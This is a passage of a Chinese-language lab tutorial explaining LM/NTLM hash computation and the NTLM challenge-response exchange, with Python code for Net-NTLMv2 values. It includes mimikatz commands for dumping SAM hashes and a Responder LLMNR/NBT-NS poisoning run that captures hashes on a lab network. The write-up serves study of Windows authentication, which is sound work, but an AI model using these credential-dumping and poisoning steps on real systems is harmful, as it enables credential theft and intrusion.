<li><p>将每组二进制数据按7bit一组，分为8组，每组末尾添0，再转16进制<br>  01010000010000000101001101010011010101110011000001010010<br>-&gt;01010000  00100000  00010100  01101010  00110100  10111000  11000000  10100100<br>-&gt;5020146a34b8c0a4</p>
</li>
</ol>
<p>  01000100000000000000000000000000000000000000000000000000<br>-&gt;01000100  00000000  00000000  00000000  00000000  00000000  00000000  00000000<br>-&gt;4400000000000000</p>
<ol start="5">
<li><p>将两组16进制字符串作为DES密钥对<code>KGS!@#$%</code>进行加密，然后将DES加密后的密文进行拼接得到LM Hash的值<br>5020146a34b8c0a4-&gt;921988BA001DC8E1<br>4400000000000000-&gt;4A3B108F3FA6CB6D<br>LM Hash:921988BA001DC8E14A3B108F3FA6CB6D</p>
</li>
<li><p>验证<br><img src="https://ooo.0x0.ooo/2024/05/09/OJaSSc.png" alt="OJaSSc.png" loading="lazy"></p>
</li>
</ol>
<p>LM Hash因为不安全容易受到爆破攻击所以几乎不再使用，特别是如果密文长度小于7,那个第二个分组加密后的结果一定为 <code>aad3b435b51404ee</code><br>如果LM Hash被禁用LM Hash的值为<code>aad3b435b51404eeaad3b435b51404ee</code></p>
<h1 id="NTLM-Hash加密算法"><a href="#NTLM-Hash加密算法" class="headerlink" title="NTLM Hash加密算法"></a><strong>NTLM Hash加密算法</strong></h1><p>NTLM Hash加密流程</p>
<ol>
<li><p>将用户密码转换为十六进制<br>123456-&gt;31 32 33 34 35 36</p>
</li>
<li><p>将十六进制格式的密码转换成Unicode格式，即在每个字节之后添加0x00<br>31 32 33 34 35 36-&gt;310032003300340035003600</p>
</li>
<li><p>使用MD4对Unicode编码数据进行Hash计算<br>310032003300340035003600-&gt;32ed87bdb5fdc5e9cba88547376818d4</p>
</li>
<li><p>python实现<br><code>python -c &quot;import hashlib,binascii;print(&#39;NTLM_Hash:&#39;+binascii.hexlify(hashlib.new(&#39;md4&#39;, &#39;123456&#39;.encode(&#39;utf-16le&#39;)).digest()).decode(&#39;utf-8&#39;))&quot; NTLM_Hash:32ed87bdb5fdc5e9cba88547376818d4</code><br><img src="https://ooo.0x0.ooo/2024/05/09/OJad1M.png" alt="OJad1M.png" loading="lazy"></p>
</li>
<li><p>验证<br><img src="https://ooo.0x0.ooo/2024/05/09/OJa0wr.png" alt="OJa0wr.png" loading="lazy"></p>
</li>
</ol>
<h1 id="Windows系统存储的NTLM-Hash"><a href="#Windows系统存储的NTLM-Hash" class="headerlink" title="Windows系统存储的NTLM Hash"></a><strong>Windows系统存储的NTLM Hash</strong></h1><p>用户密码经过NTLM Hash加密后存储在<strong>C:\Windows\system32\config\SAM</strong>文件中，当用户在进行身份认证的时候，输入密码，系统对用户输入的密码进行NTLM Hash处理，如果结果和SAM文件中的NTLM Hash相同，则认证成功。<br>当用户注销，重启，锁屏后，操作系统会让<strong>winlogon.exe</strong>显示登录界面，<strong>winlogon.exe</strong>接受输入，将密码交给<strong>lsass.exe</strong>进程，<strong>lsass.exe</strong>进程中会存一份明文密码，进行NTLM Hash加密与SAM比较。<br>mimikatz抓取NTLM Hash就是通过抓取<strong>lsass.exe</strong>内存中凭据。<br>由于无法直接打开SAM文件，所以使用<strong>mimikatz</strong>工具读取<br>按照常规操作<code>privilege::debug</code>-&gt;<code>sekurlsa::logonpasswords</code>对win11是不启用的<br>按照一下操作<code>privilege::debug</code>-&gt;<code>token::elevate</code>-&gt;<code>lsadump::sam</code><br><img src="https://ooo.0x0.ooo/2024/05/09/OJaC8s.png" alt="OJaC8s.png" loading="lazy"><br>拿到了我自己的HTLM Hash<br>使用MSF或者CS通过转存Hash抓取到的密码格式是:<br><code>用户名:用户SID值:KM Hash:HTLM Hash:::</code><br>一般第三位就是<strong>aad3b435b51404eeaad3b435b51404ee</strong><br><img src="https://ooo.0x0.ooo/2024/05/09/OJoOJa.png" alt="OJoOJa.png" loading="lazy"><br>可以看到第三位是aad3b435b51404eeaad3b435b51404ee，第四位是我的NTLM Hash值</p>
<h1 id="工作组下NTLM协议认证机制"><a href="#工作组下NTLM协议认证机制" class="headerlink" title="工作组下NTLM协议认证机制"></a>工作组下NTLM协议认证机制</h1><p>NTLM协议是一种基于**Challenge&#x2F;Response(质询&#x2F;响应)**的验证机制，由三种消息组成</p>
<ol>
<li>Type1:协商(Negotiate)</li>
<li>Type2:质询(Challenge)</li>
<li>Type3:认证(Authentication)</li>
</ol>
<p>NTLM协议由<code>V1</code>和<code>v2</code>两个版本，两者主要区别是Challenge值和加密算法的不同，共同之处都使用<strong>NTLM Hash</strong>加密<br><img src="https://ooo.0x0.ooo/2024/05/11/OJU6Za.png" alt="OJU6Za.png" loading="lazy"></p>
<ol>
<li>当客户端需要访问服务器的某个服务时，就需要进行身份认证。于是，在客户端输入服务器的用户名和密码进行验证之后，就会缓存服务器密码的<code>NTLM Hash</code>值。然后，客户端会向服务端发送一个请求，该请求利用<strong>NTLM SSP</strong>生成<strong>NTLMSSP_ NEGOTIATE</strong>消息(被称为Type1协商消息)。</li>
<li>服务端接收到客户端发送过来的Type1消息后，读取其中的内容，并从中选择自己所能接受的服务内容、加密等级、安全服务等，然后传入<strong>NTLM SSP</strong>,得到<strong>NTLMSSP_CHALLENGE</strong>消息(被称为Type2质询消息)，并将此Type2消息发回给客户端。在此Type2消息中包含一个由服务端生成的<strong>16位随机值</strong>，被称为<strong>Challenge</strong>值，服务端会将该Challenge值进行缓存。</li>
<li>客户端收到服务端返回的Type2消息后，读取服务端所支持的内容，并取出其中的<strong>Challenge</strong>值，用缓存的服务器密码的<strong>NTLM Hash</strong>对其进行加密得到<strong>Response</strong>消息。最后将<strong>Response</strong>和一些其他信息封装到<strong>NTLMSSP_AUTH</strong>消息中（被称为Type3认证消息），发往服务端。</li>
<li>服务端收到认证消息后，从中取出<strong>Net-NTLM Hash</strong>,然后用自己密码的<strong>NTLM Hash</strong>对<strong>Challenge</strong>值进行一系列加密运算，得到自己计算的<strong>Net-NTLM Hash</strong>,并比较自己计算出的<strong>Net-NTLM Hash</strong>和客户端发送的<strong>Net-NTLM Hash</strong>是否相等。如果相等，则证明客户端输人的密码正确，从而认证成功，反之则认证失败。</li>
</ol>
<h2 id="实验检验"><a href="#实验检验" class="headerlink" title="实验检验"></a>实验检验</h2><p>SMB 服务端 192.168.31.178<br>客户端 192.168.31.34<br><img src="https://ooo.0x0.ooo/2024/05/10/OJqu2s.png" alt="OJqu2s.png" loading="lazy"><br>先在kali上打开wireshark，然后smb连接win10服务端</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># smbclient //192.168.31.178/Users -U test</span>
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>test<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> </code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/10/OJqwVS.png" alt="OJqwVS.png" loading="lazy"><br>根据抓包可以看到一个标志性的包，<code>NTLMSSP_ NEGOTIATE</code>,<code>NTLMSSP_CHALLENGE</code>,<code>NTLMSSP_AUTH</code><br>分别来看看几个阶段</p>
<ol>
<li>协商<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5hAv.png" alt="OJ5hAv.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5iSq.png" alt="OJ5iSq.png" loading="lazy"><br><strong>security mode</strong>的<strong>Signing enabled</strong>为True，<strong>Signing required</strong>为False表明客户端支持签名， 但是协商不签名。工作组环境下默认都不签名。</li>
<li>Negotiate包<br>第五个包是Negotiate包<br>一些需要协商的flag<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5nCc.png" alt="OJ5nCc.png" loading="lazy"></li>
<li>Challenge包<br>第6个包是Challenge包，由服务端发往客户端，可以看到challenge值<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ57nr.png" alt="OJ57nr.png" loading="lazy"></li>
<li>Authenticate包<br>在response中有6中响应类型<ol>
<li>LM响应，由低版本客户端发送</li>
<li>NTLM v1响应，这是基于NT的客户端发送，包括Windows 2000 和xp</li>
<li>HTLM v2响应，在Windows NT Server Pack4中引入一种较新的响应类型。他替换启动了NTLM v2系统上的NTLM响应</li>
<li>LM v2响应，替换NTLM v2系统上的LM响应</li>
<li>NTLM v2会话响应，用于在没有NTLM v2身份验证的情况下协商NTLM v2会话安全性，此方案会更改LM NTLM响应的语义</li>
<li>匿名响应，当匿名上下文正在建立时使用，没有提供实际的证书，也没有真正的身份验证。“存根”字段显示在Type3消息中<br>这6中响应类型使用的加密流程一样，都上前面所说的Challenge&#x2F;Response验证机制，不同之处在于Challenge值和加密算法。至于选择哪种由LmCompatibility-Level决定。<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5NDM.png" alt="OJ5NDM.png" loading="lazy"><br>本次测试可以看到是NTLM v2类型的响应，在该字段下可以看到<strong>NTProofStr</strong>字段，该字段的值是用做数据签名的Hash(HMAC-MD5)值，目的是保证数据的完整性。<br>NTLMv2 Hash&#x3D;HMAC-MD5(unicode(hex((upper(Username)+DomainName))),NTLM_Hash)<br>NTProofStr&#x3D;HMAC-MD5(challenge+blob,NTLMv2 Hash)<br>微软为了防止数据包被中途篡改，使用<strong>exportedSessionKey</strong>加密三个NTLM消息来保证数据包的完整性，而由于<strong>exportedSessionKey</strong>仅对启动认证的账户和目标服务器已知，因此有了MIC，攻击者于是无法通过篡改NTLM认证数据包。<br>MIC&#x3D;HMAC_MD5(exportedSessionKey,NEGOTIATE_MESSAGE+CHALLENGE_MESSAGE+AUTHENTICATE_MESSAGE)<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5e6G.png" alt="OJ5e6G.png" loading="lazy"></li>
</ol>
</li>
<li>返回成功与否<br>第8个数据包返回成功的结果</li>
<li>签名<br>在认证完成后，根据协商的字段值来确定是否需要对后续数据包进行签名。<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5e6G.png" alt="OJ5e6G.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/05/10/OJ5HpK.png" alt="OJ5HpK.png" loading="lazy"><br>在第7个数据包中可以看到<strong>Session Key</strong>字段，<strong>Session Key</strong>是用来进行协商加密密钥的。<br>看下<strong>Session Key</strong>的生成函数<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generateEncryptedSessionKey</span><span class="token punctuation">(</span>keyExchangeKey<span class="token punctuation">,</span>exportedSessionKey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher<span class="token operator">=</span>ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span>keyExchangeKey<span class="token punctuation">)</span>
    cipher_encrypt<span class="token operator">=</span>cipher<span class="token punctuation">.</span>encrypt
    sessionKey<span class="token operator">=</span>cipher_encrypt<span class="token punctuation">(</span>exportedSessionKey<span class="token punctuation">)</span>
    <span class="token keyword">return</span> sessionKey</code></pre>
Session Key是由keyExchangeKey和exportedSessionKey经过一系列运算得到<br>再看下keyExchangeKey是如何生成<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">KXKEY</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span>sessionBaseKey<span class="token punctuation">,</span>lmChallengeResponse<span class="token punctuation">,</span>serverChallenge<span class="token punctuation">,</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">,</span>nthash<span class="token punctuation">,</span>use_ntlmv2<span class="token operator">=</span>USE_NTLMv2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> use_ntlmv2<span class="token punctuation">:</span>
        <span class="token keyword">return</span> sessionBaseKey
    <span class="token keyword">if</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_EXTENDED_SESSIONCURITY<span class="token punctuation">:</span>
        <span class="token keyword">if</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_NTLM_SESSIONSECURITY<span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>hmac_md5<span class="token punctuation">(</span>sessionBaseKey<span class="token punctuation">,</span>serverChallenge<span class="token operator">+</span>lmChallengeResponse<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span>
            keyExchangeKey<span class="token operator">=</span>sessionBaseKey
    <span class="token keyword">elif</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_NTLM<span class="token punctuation">:</span>
        <span class="token keyword">if</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_LM_KEY<span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>__DES_block<span class="token punctuation">(</span>LMOWFv1<span class="token punctuation">(</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>lmChallengeResponse<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>__DES_block<span class="token punctuation">(</span>LMOWFv1<span class="token punctuation">(</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b'\xBD\xBD\xBD\xBD\xBD\xBD'</span><span class="token punctuation">,</span>lmChallengeResponse<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> flags <span class="token operator">&amp;</span> NTLMSSP_REQUEST_NON_NT_SESION_KEY<span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>LMOWFv1<span class="token punctuation">(</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">8</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>sessionBaseKey
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Can't create a valid KXKEY"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> keyExchangeKey</code></pre>
<strong>keyExchangeKey</strong>是由<strong>password</strong>和<strong>serverChallenge</strong>等值经过一系列运算得到<br>而exportedSessionKey是客户端生成的随机数，用来加解密liu’l，代码如下<br>exportedSessionKey &#x3D; b(“”.join([random.choice(string.digists+string.ascii_letters) for _  in range(16)]))</li>
</ol>
<p>客户端和服务端通过<strong>Session Key</strong>协商密钥过程如下<br>首先，客户端会生成一个随机数<strong>exportedSessionKey</strong>，后续都使用这个<strong>exportedSessionKey</strong>来加解密流量。<strong>exportedSessionKey</strong>是客户端生成的，服务端并不知道。<br>客户端使用<strong>keyExchangeKey</strong>作为Key，用<strong>CR4</strong>加密算法加密<strong>exportedSessionKey</strong>，得到的流量中看到<strong>Session Key</strong>。服务器端拿到流量后，使用用户密码和Challenge值经过运算生成<strong>keyExchangeKey</strong>,然后使用Session<br>Key与KeyExchangeKey一起运算得到<strong>exportedSessionKey</strong>,最后使用<strong>exportedSessionKey</strong>加解密流量。对于攻击者来说，由于没有用户的密码，因此无法生成keyExchangeKey。所以，攻击者即使拿到了流量，也无法计算出<strong>exportedSessionKey</strong>，自然无法解密流量。</p>
<h2 id="Net-NTLM-v2-Hash的计算"><a href="#Net-NTLM-v2-Hash的计算" class="headerlink" title="Net-NTLM v2 Hash的计算"></a>Net-NTLM v2 Hash的计算</h2><p>NTLM v2的Response消息生成过程:</p>
<ol>
<li>将大写的<strong>Username</strong>和<strong>Domain name</strong>(区分大小写)拼接在一起转换成16进制，然后双字节Unicode编码得到<strong>data</strong>，接着使用16B NTLM哈希值作为密钥key，用data和key进行<strong>HMAC_MD5</strong>加密得到<strong>NTLM v2 Hash</strong></li>
<li>构建一个blob信息</li>
<li>使用16字节<strong>NTLM v2 Hash</strong>作为密钥，将<strong>HMAC_MD5</strong>消息认证代码算法加密一个值(来自Type2的Challenge与blob拼接在一起)，得到一个16B的<strong>NTProotStr(HMAC_MD5)</strong></li>
<li>将<strong>NTProofStr</strong>与<strong>blob</strong>拼接得到<strong>Response</strong><br>使用<strong>Responder</strong>工具抓取<strong>NTLM Response</strong>消息的时候，抓取的都是<strong>Net-NTLM Hash</strong>格式的数据<br>Net-NTLM v2 Hash的格式:<br><strong>username::domain:challenge:HMAC_MD5:blob</strong><br>username: 要访问服务器的用户名<br>domain: 域信息<br>challenge: 数据包6中服务器返回challenge值<br>HMAC-MD5: 数据包7中的NTProofStr<br>blob: 数据包7中NTLM v2 Response去掉NTProofStr的后半部分<pre class="language-none"><code class="language-none">NTLM v2 Hash&#x3D;HMAC-MD5(unicode(hex((upper(UserName)+DomainName))),NTLM Hash)
NTProofStr&#x3D;HMAC-MD5(challenge+blob,NTLMv2 Hash)</code></pre>
计算NTLM v2 Hash，NTProofStr以及Response值的代码如下<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> binascii
<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> t <span class="token keyword">in</span> string<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hex_to_unicode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> string<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"00"</span>
<span class="token keyword">def</span> <span class="token function">Ntlm_hash</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"md4"</span><span class="token punctuation">,</span>string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-16le"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hmac_md5</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">=</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    username<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Username:"</span><span class="token punctuation">)</span>
    password<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Password:"</span><span class="token punctuation">)</span>
    domain_name<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Domain_name:"</span><span class="token punctuation">)</span>
    challenge<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Challenge:"</span><span class="token punctuation">)</span>
    blob<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input blob:"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
    HEX<span class="token operator">=</span>str_to_hex<span class="token punctuation">(</span>username<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>domain_name<span class="token punctuation">)</span>
    data<span class="token operator">=</span>hex_to_unicode<span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>
    key<span class="token operator">=</span>Ntlm_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
    NTLM_v2_Hash<span class="token operator">=</span>hmac_md5<span class="token punctuation">(</span>key<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NTLM_v2_Hash:"</span><span class="token operator">+</span>NTLM_v2_Hash<span class="token punctuation">)</span>
    data2<span class="token operator">=</span>challenge<span class="token operator">+</span>blob
    NTProofStr<span class="token operator">=</span>hmac_md5<span class="token punctuation">(</span>NTLM_v2_Hash<span class="token punctuation">,</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NTProofStr:"</span><span class="token operator">+</span>NTProofStr<span class="token punctuation">)</span>
    Response<span class="token operator">=</span>username<span class="token operator">+</span><span class="token string">"::"</span><span class="token operator">+</span>domain_name<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>challenge<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>NTProofStr<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>blob
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response:"</span><span class="token operator">+</span>Response<span class="token punctuation">)</span></code></pre></li>
</ol>
<h2 id="responder实验"><a href="#responder实验" class="headerlink" title="responder实验"></a>responder实验</h2><p>下面实验验证一下Responder抓取NTLM v2 Responde消息然后使用hashcat进行爆破<br>攻击机kali:192.168.31.34<br>靶机win10:192.168.31.178<br>kali自带Responder直接使用即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># responder -I eth0     </span>
                                         __
  .----.-----.-----.-----.-----.-----.--<span class="token operator">|</span>  <span class="token operator">|</span>.-----.----.
  <span class="token operator">|</span>   _<span class="token operator">|</span>  -__<span class="token operator">|</span>__ --<span class="token operator">|</span>  _  <span class="token operator">|</span>  _  <span class="token operator">|</span>     <span class="token operator">|</span>  _  <span class="token operator">||</span>  -__<span class="token operator">|</span>   _<span class="token operator">|</span>
  <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span>_____<span class="token operator">|</span>   __<span class="token operator">|</span>_____<span class="token operator">|</span>__<span class="token operator">|</span>__<span class="token operator">|</span>_____<span class="token operator">||</span>_____<span class="token operator">|</span>__<span class="token operator">|</span>
                   <span class="token operator">|</span>__<span class="token operator">|</span>

           NBT-NS, LLMNR <span class="token operator">&amp;</span> MDNS Responder <span class="token number">3.1</span>.4.0

  To support this project:
  Github -<span class="token operator">></span> https://github.com/sponsors/lgandx
  Paypal  -<span class="token operator">></span> https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="token punctuation">(</span>laurent.gaffie@gmail.com<span class="token punctuation">)</span>
  To <span class="token function">kill</span> this script hit CTRL-C


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Poisoners:
    LLMNR                      <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    NBT-NS                     <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    MDNS                       <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DNS                        <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DHCP                       <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Servers:
    HTTP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    HTTPS server               <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    WPAD proxy                 <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Auth proxy                 <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    SMB server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    Kerberos server            <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SQL server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    FTP server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    IMAP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    POP3 server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SMTP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DNS server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    LDAP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    MQTT server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    RDP server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DCE-RPC server             <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    WinRM server               <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SNMP server                <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> HTTP Options:
    Always serving EXE         <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Serving EXE                <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Serving HTML               <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Upstream Proxy             <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Poisoning Options:
    Analyze Mode               <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force WPAD auth            <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force Basic Auth           <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force LM downgrade         <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force ESS downgrade        <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generic Options:
    Responder NIC              <span class="token punctuation">[</span>eth0<span class="token punctuation">]</span>
    Responder IP               <span class="token punctuation">[</span><span class="token number">192.168</span>.31.34<span class="token punctuation">]</span>
    Responder IPv6             <span class="token punctuation">[</span>fe80::20c:29ff:fed2:e049<span class="token punctuation">]</span>
    Challenge <span class="token builtin class-name">set</span>              <span class="token punctuation">[</span>random<span class="token punctuation">]</span>
    Don<span class="token string">'t Respond To Names     ['</span>ISATAP<span class="token string">', '</span>ISATAP.LOCAL'<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Current Session Variables:
    Responder Machine Name     <span class="token punctuation">[</span>WIN-JNOQBZ1D6K9<span class="token punctuation">]</span>
    Responder Domain Name      <span class="token punctuation">[</span>NNLN.LOCAL<span class="token punctuation">]</span>
    Responder DCE-RPC Port     <span class="token punctuation">[</span><span class="token number">49009</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Listening <span class="token keyword">for</span> events<span class="token punctuation">..</span>.                           </code></pre>
<p>开启监听eth0网卡<br>在win10靶机上访问一个不存在的共享目录比如\111\123,随便输入即可<br><img src="https://ooo.0x0.ooo/2024/05/11/OJBuya.png" alt="OJBuya.png" loading="lazy"><br>然后kali监听到信息，捕捉HTLM v2 Hash值</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name WIN-N5633OS4LCV <span class="token punctuation">(</span>service: Domain Controller<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name WORKGROUP <span class="token punctuation">(</span>service: Domain Master Browser<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
